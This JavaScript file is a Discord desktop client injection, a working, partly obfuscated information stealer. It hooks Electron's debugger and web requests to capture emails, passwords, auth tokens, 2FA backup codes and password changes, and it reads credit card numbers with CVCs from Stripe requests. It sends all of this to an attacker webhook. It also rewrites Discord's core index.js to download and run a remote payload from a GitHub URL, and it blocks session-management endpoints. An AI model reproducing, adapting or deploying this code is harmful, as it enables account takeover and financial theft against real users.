const fs = require('fs'),
  os = require('os'),
  https = require('https'),
  args = process.argv,
  path = require('path'),
  querystring = require('querystring'),
  { BrowserWindow, session, app } = require('electron'),
  CONFIG = {
    webhook: '%WEBHOOK%',
    injection_url:
      'https://raw.githubusercontent.com/drxz1337/injectionz/main/etitzx.js',
    filters: {
      urls: [
        '/auth/login',
        '/auth/register',
        '/mfa/totp',
        '/mfa/codes-verification',
        '/users/@me',
      ],
    },
    filters2: {
      urls: [
        'wss://remote-auth-gateway.discord.gg/*',
        'https://discord.com/api/v*/auth/sessions',
        'https://*.discord.com/api/v*/auth/sessions',
        'https://discordapp.com/api/v*/auth/sessions',
      ],
    },
    payment_filters: {
      urls: [
        'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
        'https://api.stripe.com/v*/tokens',
      ],
    },
    API: 'https://discord.com/api/v9/users/@me',
    badges: {
      Discord_Emloyee: {
        Value: 1,
        Emoji: '<:8485discordemployee:1163172252989259898>',
        Rare: true,
      },
      Partnered_Server_Owner: {
        Value: 2,
        Emoji: '<:9928discordpartnerbadge:1163172304155586570>',
        Rare: true,
      },
      HypeSquad_Events: {
        Value: 4,
        Emoji: '<:9171hypesquadevents:1163172248140660839>',
        Rare: true,
      },
      Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: '<:4744bughunterbadgediscord:1163172239970140383>',
        Rare: true,
      },
      Early_Supporter: {
        Value: 512,
        Emoji: '<:5053earlysupporter:1163172241996005416>',
        Rare: true,
      },
      Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: '<:1757bugbusterbadgediscord:1163172238942543892>',
        Rare: true,
      },
      Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: '<:1207iconearlybotdeveloper:1163172236807639143>',
        Rare: true,
      },
      House_Bravery: {
        Value: 64,
        Emoji: '<:6601hypesquadbravery:1163172246492287017>',
        Rare: false,
      },
      House_Brilliance: {
        Value: 128,
        Emoji: '<:6936hypesquadbrilliance:1163172244474822746>',
        Rare: false,
      },
      House_Balance: {
        Value: 256,
        Emoji: '<:5242hypesquadbalance:1163172243417858128>',
        Rare: false,
      },
      Active_Developer: {
        Value: 4194304,
        Emoji: '<:1207iconactivedeveloper:1163172534443851868>',
        Rare: false,
      },
      Certified_Moderator: {
        Value: 262144,
        Emoji: '<:4149blurplecertifiedmoderator:1163172255489085481>',
        Rare: true,
      },
      Spammer: {
        Value: 1048704,
        Emoji: '\u2328️',
        Rare: false,
      },
    },
  },
  executeJS = (_0x50e150) => {
    const _0xd6d183 = BrowserWindow.getAllWindows()[0]
    return _0xd6d183.webContents.executeJavaScript(_0x50e150, true)
  },
  clearAllUserData = () => {
    const _0x50c6f2 = BrowserWindow.getAllWindows()[0]
    _0x50c6f2.webContents.session.flushStorageData()
    _0x50c6f2.webContents.session.clearStorageData()
    app.relaunch()
    app.exit()
  },
  getToken = async () =>
    await executeJS(
      "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
    ),
  request = async (_0x2cb18f, _0x4743b3, _0x37ea94, _0x53ac65) => {
    _0x4743b3 = new URL(_0x4743b3)
    const _0x1c82f4 = {
      protocol: _0x4743b3.protocol,
      hostname: _0x4743b3.host,
      path: _0x4743b3.pathname,
      method: _0x2cb18f,
      headers: { 'Access-Control-Allow-Origin': '*' },
    }
    if (_0x4743b3.search) {
      _0x1c82f4.path += _0x4743b3.search
    }
    for (const _0x239753 in _0x37ea94)
      _0x1c82f4.headers[_0x239753] = _0x37ea94[_0x239753]
    const _0x3266ed = https.request(_0x1c82f4)
    if (_0x53ac65) {
      _0x3266ed.write(_0x53ac65)
    }
    return (
      _0x3266ed.end(),
      new Promise((_0x51ecea, _0x246e14) => {
        _0x3266ed.on('response', (_0x97fc72) => {
          let _0x1b4faf = ''
          _0x97fc72.on('data', (_0x5ca35c) => (_0x1b4faf += _0x5ca35c))
          _0x97fc72.on('end', () => _0x51ecea(_0x1b4faf))
        })
      })
    )
  },
  hooker = async (_0x5dd437, _0x11e5c4, _0x565989) => {
    _0x5dd437.content =
      '`' +
      os.hostname() +
      '` - `' +
      os.userInfo().username +
      '`\n\n' +
      _0x5dd437.content
    _0x5dd437.username = 'Xen#3117'
    _0x5dd437.avatar_url =
      'https://i.hizliresim.com/rei32qa.jpg'
    _0x5dd437.embeds[0].author = { name: _0x565989.username }
    _0x5dd437.embeds[0].thumbnail = {
      url:
        'https://cdn.discordapp.com/avatars/' +
        _0x565989.id +
        '/' +
        _0x565989.avatar +
        '.webp',
    }
    _0x5dd437.embeds[0].footer = {
      text: 'htrb3117x | xen.',
      icon_url: 'https://i.hizliresim.com/5hgxpg1.jpg',
    }
    _0x5dd437.embeds[0].title = 'Account Information'
    const _0x488f7a = getNitro(_0x565989.premium_type),
      _0x35ee85 = getBadges(_0x565989.flags),
      _0x3034e0 = await getBilling(_0x11e5c4),
      _0x1a0c3c = await getFriends(_0x11e5c4),
      _0x45965a = await getServers(_0x11e5c4)
    _0x5dd437.embeds[0].fields.push(
      {
        name: 'Token',
        value: '```' + _0x11e5c4 + '```',
        inline: false,
      },
      {
        name: 'Nitro',
        value: _0x488f7a,
        inline: true,
      },
      {
        name: 'Badges',
        value: _0x35ee85,
        inline: true,
      },
      {
        name: 'Billing',
        value: _0x3034e0,
        inline: true,
      }
    )
    _0x5dd437.embeds.push(
      {
        title: 'Total Friends: ' + _0x1a0c3c.totalFriends,
        description: _0x1a0c3c.message,
      },
      {
        title: 'Total Servers: ' + _0x45965a.totalGuilds,
        description: _0x45965a.message,
      }
    )
    for (const _0x263ee1 in _0x5dd437.embeds) {
      _0x5dd437.embeds[_0x263ee1].color = 11617251
    }
    await request(
      'POST',
      CONFIG.webhook,
      { 'Content-Type': 'application/json' },
      JSON.stringify(_0x5dd437)
    )
  },
  fetch = async (_0xfbd9ad, _0x5ae281) => {
    return JSON.parse(await request('GET', CONFIG.API + _0xfbd9ad, _0x5ae281))
  },
  fetchAccount = async (_0x58ba60) =>
    await fetch('', { Authorization: _0x58ba60 }),
  fetchBilling = async (_0x1b0488) =>
    await fetch('/billing/payment-sources', { Authorization: _0x1b0488 }),
  fetchServers = async (_0x592e5f) =>
    await fetch('/guilds?with_counts=true', { Authorization: _0x592e5f }),
  fetchFriends = async (_0xeb7a9f) =>
    await fetch('/relationships', { Authorization: _0xeb7a9f }),
  getNitro = (_0x3f33ff) => {
    switch (_0x3f33ff) {
      case 1:
        return '`Nitro Classic`'
      case 2:
        return '`Nitro Boost`'
      case 3:
        return '`Nitro Basic`'
      default:
        return '`\u274C`'
    }
  },
  getBadges = (_0x24a96a) => {
    let _0x50ae5c = ''
    for (const _0x3ea2a8 in CONFIG.badges) {
      let _0x2b2022 = CONFIG.badges[_0x3ea2a8]
      if ((_0x24a96a & _0x2b2022.Value) == _0x2b2022.Value) {
        _0x50ae5c += _0x2b2022.Emoji + ' '
      }
    }
    return _0x50ae5c || '`\u274C`'
  },
  getRareBadges = (_0x1c466c) => {
    let _0x3493f8 = ''
    for (const _0x49c159 in CONFIG.badges) {
      let _0x5bca31 = CONFIG.badges[_0x49c159]
      if ((_0x1c466c & _0x5bca31.Value) == _0x5bca31.Value && _0x5bca31.Rare) {
        _0x3493f8 += _0x5bca31.Emoji + ' '
      }
    }
    return _0x3493f8
  },
  getBilling = async (_0x12cd85) => {
    const _0x480b30 = await fetchBilling(_0x12cd85)
    let _0x1b0eba = ''
    return (
      _0x480b30.forEach((_0x340593) => {
        if (!_0x340593.invalid) {
          switch (_0x340593.type) {
            case 1:
              _0x1b0eba += '\uD83D\uDCB3 '
              break
            case 2:
              _0x1b0eba += '<:paypal:1148653305376034967> '
              break
          }
        }
      }),
      _0x1b0eba || '`\u274C`'
    )
  },
  getFriends = async (_0x315c5a) => {
    const _0x2e7a9e = await fetchFriends(_0x315c5a),
      _0x1c651e = _0x2e7a9e.filter((_0x1c5dd7) => {
        return _0x1c5dd7.type == 1
      })
    let _0x4bf88b = ''
    for (const _0x2f2214 of _0x1c651e) {
      var _0x71bc02 = getRareBadges(_0x2f2214.user.public_flags)
      if (_0x71bc02 != '') {
        if (!_0x4bf88b) {
          _0x4bf88b = '**Rare Friends:**\n'
        }
        _0x4bf88b +=
          _0x71bc02 +
          ' ' +
          _0x2f2214.user.username +
          '#' +
          _0x2f2214.user.discriminator +
          '\n'
      }
    }
    return (
      (_0x4bf88b = _0x4bf88b || '**No Rare Friends**'),
      {
        message: _0x4bf88b,
        totalFriends: _0x2e7a9e.length,
      }
    )
  },
  getServers = async (_0x4caf9f) => {
    const _0x4809c3 = await fetchServers(_0x4caf9f),
      _0x3893e8 = _0x4809c3.filter(
        (_0x33ad53) => _0x33ad53.permissions == '562949953421311'
      )
    let _0x1914c2 = ''
    for (const _0x28f272 of _0x3893e8) {
      _0x1914c2 === '' && (_0x1914c2 += '**Rare Servers:**\n')
      _0x1914c2 +=
        (_0x28f272.owner
          ? '<:SA_Owner:991312415352430673> Owner'
          : '<:admin:967851956930482206> Admin') +
        ' | Server Name: `' +
        _0x28f272.name +
        '` - Members: `' +
        _0x28f272.approximate_member_count +
        '`\n'
    }
    return (
      (_0x1914c2 = _0x1914c2 || '**No Rare Servers**'),
      {
        message: _0x1914c2,
        totalGuilds: _0x4809c3.length,
      }
    )
  },
  EmailPassToken = async (_0x55d40f, _0x4c06c5, _0x7ba626, _0x34e08c) => {
    const _0x120e22 = await fetchAccount(_0x7ba626),
      _0x42fa78 = {
        content: '**' + _0x120e22.username + '** just ' + _0x34e08c + '!',
        embeds: [
          {
            fields: [
              {
                name: 'Email',
                value: '`' + _0x55d40f + '`',
                inline: true,
              },
              {
                name: 'Password',
                value: '`' + _0x4c06c5 + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    hooker(_0x42fa78, _0x7ba626, _0x120e22)
  },
  BackupCodesViewed = async (_0x36dc11, _0x443a2d) => {
    const _0xfea83 = await fetchAccount(_0x443a2d),
      _0x3f7a8f = _0x36dc11.filter((_0x3faee8) => {
        return _0x3faee8.consumed === false
      })
    let _0x41e602 = ''
    for (let _0x10fd73 of _0x3f7a8f) {
      _0x41e602 +=
        _0x10fd73.code.substr(0, 4) + '-' + _0x10fd73.code.substr(4) + '\n'
    }
    const _0x150c5d = {
      content:
        '**' + _0xfea83.username + '** just viewed his 2FA backup codes!',
      embeds: [
        {
          fields: [
            {
              name: 'Backup Codes',
              value: '```' + _0x41e602 + '```',
              inline: false,
            },
            {
              name: 'Email',
              value: '`' + _0xfea83.email + '`',
              inline: true,
            },
            {
              name: 'Phone',
              value: '`' + (_0xfea83.phone || 'None') + '`',
              inline: true,
            },
          ],
        },
      ],
    }
    hooker(_0x150c5d, _0x443a2d, _0xfea83)
  },
  PasswordChanged = async (_0x4b4430, _0x3c9eff, _0x36e2de) => {
    const _0x481d93 = await fetchAccount(_0x36e2de),
      _0x7e1c7f = {
        content: '**' + _0x481d93.username + '** just changed his password!',
        embeds: [
          {
            fields: [
              {
                name: 'New Password',
                value: '`' + _0x4b4430 + '`',
                inline: true,
              },
              {
                name: 'Old Password',
                value: '`' + _0x3c9eff + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    hooker(_0x7e1c7f, _0x36e2de, _0x481d93)
  },
  CreditCardAdded = async (
    _0x1a7dfa,
    _0x587764,
    _0x288b42,
    _0x56e2c2,
    _0xd30062
  ) => {
    const _0x19c711 = await fetchAccount(_0xd30062),
      _0x276036 = {
        content: '**' + _0x19c711.username + '** just added a credit card!',
        embeds: [
          {
            fields: [
              {
                name: 'Number',
                value: '`' + _0x1a7dfa + '`',
                inline: true,
              },
              {
                name: 'CVC',
                value: '`' + _0x587764 + '`',
                inline: true,
              },
              {
                name: 'Expiration',
                value: '`' + _0x288b42 + '/' + _0x56e2c2 + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    hooker(_0x276036, _0xd30062, _0x19c711)
  },
  PaypalAdded = async (_0x499630) => {
    const _0x137f1c = await fetchAccount(_0x499630),
      _0x442a96 = {
        content:
          '**' +
          _0x137f1c.username +
          '** just added a <:paypal:1148653305376034967> account!',
        embeds: [
          {
            fields: [
              {
                name: 'Email',
                value: '`' + _0x137f1c.email + '`',
                inline: true,
              },
              {
                name: 'Phone',
                value: '`' + (_0x137f1c.phone || 'None') + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    hooker(_0x442a96, _0x499630, _0x137f1c)
  },
  discordPath = (function () {
    const _0x2dfed5 = args[0].split(path.sep).slice(0, -1).join(path.sep)
    let _0x336542
    if (process.platform === 'win32') {
      _0x336542 = path.join(_0x2dfed5, 'resources')
    } else {
      process.platform === 'darwin' &&
        (_0x336542 = path.join(_0x2dfed5, 'Contents', 'Resources'))
    }
    if (fs.existsSync(_0x336542)) {
      return {
        resourcePath: _0x336542,
        app: _0x2dfed5,
      }
    }
    return {
      undefined: undefined,
      undefined: undefined,
    }
  })()
async function initiation() {
  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
    fs.rmdirSync(path.join(__dirname, 'initiation'))
    const _0x27692a = await getToken()
    if (!_0x27692a) {
      return
    }
    const _0x48d6ed = await fetchAccount(_0x27692a),
      _0x34761b = {
        content: '**' + _0x48d6ed.username + '** just got injected!',
        embeds: [
          {
            fields: [
              {
                name: 'Email',
                value: '`' + _0x48d6ed.email + '`',
                inline: true,
              },
              {
                name: 'Phone',
                value: '`' + (_0x48d6ed.phone || 'None') + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    await hooker(_0x34761b, _0x27692a, _0x48d6ed)
    clearAllUserData()
  }
  const { resourcePath: _0x2f3b4e, app: _0x25a733 } = discordPath
  if (_0x2f3b4e === undefined || _0x25a733 === undefined) {
    return
  }
  const _0x382bbb = path.join(_0x2f3b4e, 'app'),
    _0x1e2245 = path.join(_0x382bbb, 'package.json'),
    _0x593856 = path.join(_0x382bbb, 'index.js'),
    _0x6ad7e9 = fs
      .readdirSync(_0x25a733 + '\\modules\\')
      .filter((_0x2d3e0e) => /discord_desktop_core-+?/.test(_0x2d3e0e))[0],
    _0x190328 =
      _0x25a733 +
      '\\modules\\' +
      _0x6ad7e9 +
      '\\discord_desktop_core\\index.js',
    _0x555923 = path.join(
      process.env.APPDATA,
      '\\betterdiscord\\data\\betterdiscord.asar'
    )
  if (!fs.existsSync(_0x382bbb)) {
    fs.mkdirSync(_0x382bbb)
  }
  if (fs.existsSync(_0x1e2245)) {
    fs.unlinkSync(_0x1e2245)
  }
  if (fs.existsSync(_0x593856)) {
    fs.unlinkSync(_0x593856)
  }
  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      _0x1e2245,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4
      )
    )
    const _0x19bdb0 =
      "const fs = require('fs'), https = require('https');\n  const indexJs = '" +
      _0x190328 +
      "';\n  const bdPath = '" +
      _0x555923 +
      "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" +
      CONFIG.injection_url +
      "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '" +
      CONFIG.webhook +
      "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" +
      path.join(_0x2f3b4e, 'app.asar') +
      "')\n  if (fs.existsSync(bdPath)) require(bdPath);"
    fs.writeFileSync(_0x593856, _0x19bdb0.replace(/\\/g, '\\\\'))
  }
}
let email = '',
  password = '',
  initiationCalled = false
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0]
  if (!mainWindow) {
    return
  }
  mainWindow.webContents.debugger.attach('1.3')
  mainWindow.webContents.debugger.on(
    'message',
    async (_0x2e653f, _0x322463, _0x253301) => {
      !initiationCalled && (await initiation(), (initiationCalled = true))
      if (_0x322463 !== 'Network.responseReceived') {
        return
      }
      if (
        !CONFIG.filters.urls.some((_0x4f8f2c) =>
          _0x253301.response.url.endsWith(_0x4f8f2c)
        )
      ) {
        return
      }
      if (![200, 202].includes(_0x253301.response.status)) {
        return
      }
      const _0x30400a = await mainWindow.webContents.debugger.sendCommand(
          'Network.getResponseBody',
          { requestId: _0x253301.requestId }
        ),
        _0x493844 = JSON.parse(_0x30400a.body),
        _0x251554 = await mainWindow.webContents.debugger.sendCommand(
          'Network.getRequestPostData',
          { requestId: _0x253301.requestId }
        ),
        _0x49b6cf = JSON.parse(_0x251554.postData)
      switch (true) {
        case _0x253301.response.url.endsWith('/login'):
          if (!_0x493844.token) {
            email = _0x49b6cf.login
            password = _0x49b6cf.password
            return
          }
          EmailPassToken(
            _0x49b6cf.login,
            _0x49b6cf.password,
            _0x493844.token,
            'logged in'
          )
          break
        case _0x253301.response.url.endsWith('/register'):
          EmailPassToken(
            _0x49b6cf.email,
            _0x49b6cf.password,
            _0x493844.token,
            'signed up'
          )
          break
        case _0x253301.response.url.endsWith('/totp'):
          EmailPassToken(email, password, _0x493844.token, 'logged in with 2FA')
          break
        case _0x253301.response.url.endsWith('/codes-verification'):
          BackupCodesViewed(_0x493844.backup_codes, await getToken())
          break
        case _0x253301.response.url.endsWith('/@me'):
          if (!_0x49b6cf.password) {
            return
          }
          _0x49b6cf.email &&
            EmailPassToken(
              _0x49b6cf.email,
              _0x49b6cf.password,
              _0x493844.token,
              'changed his email to **' + _0x49b6cf.email + '**'
            )
          _0x49b6cf.new_password &&
            PasswordChanged(
              _0x49b6cf.new_password,
              _0x49b6cf.password,
              _0x493844.token
            )
          break
      }
    }
  )
  mainWindow.webContents.debugger.sendCommand('Network.enable')
  mainWindow.on('closed', () => {
    createWindow()
  })
}
createWindow()
session.defaultSession.webRequest.onCompleted(
  CONFIG.payment_filters,
  async (_0x30c55a, _0x27b751) => {
    if (![200, 202].includes(_0x30c55a.statusCode)) {
      return
    }
    if (_0x30c55a.method != 'POST') {
      return
    }
    switch (true) {
      case _0x30c55a.url.endsWith('tokens'):
        const _0x56ae16 = querystring.parse(
          Buffer.from(_0x30c55a.uploadData[0].bytes).toString()
        )
        CreditCardAdded(
          _0x56ae16['card[number]'],
          _0x56ae16['card[cvc]'],
          _0x56ae16['card[exp_month]'],
          _0x56ae16['card[exp_year]'],
          await getToken()
        )
        break
      case _0x30c55a.url.endsWith('paypal_accounts'):
        PaypalAdded(await getToken())
        break
    }
  }
)
session.defaultSession.webRequest.onBeforeRequest(
  CONFIG.filters2,
  (_0x317348, _0x2422be) => {
    if (
      _0x317348.url.startsWith('wss://remote-auth-gateway') ||
      _0x317348.url.endsWith('auth/sessions')
    ) {
      return _0x2422be({ cancel: true })
    }
  }
)
module.exports = require('./core.asar')
